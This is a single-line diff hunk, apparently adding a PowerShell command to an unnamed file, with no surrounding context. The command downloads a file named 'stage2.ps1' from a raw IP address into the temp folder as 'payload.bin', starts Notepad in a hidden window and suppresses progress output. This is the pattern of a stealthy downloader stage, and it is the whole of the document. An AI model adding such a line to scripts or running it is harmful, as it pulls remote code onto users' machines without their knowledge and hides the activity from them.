@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://203.0.113.28/stage2.ps1" -OutFile "$env:TEMP\payload.bin" -UseBasicParsing; Start-Process -FilePath "notepad.exe" -WindowStyle Hidden; $ProgressPreference = "SilentlyContinue"; Set-Location -Path $env:TEMP
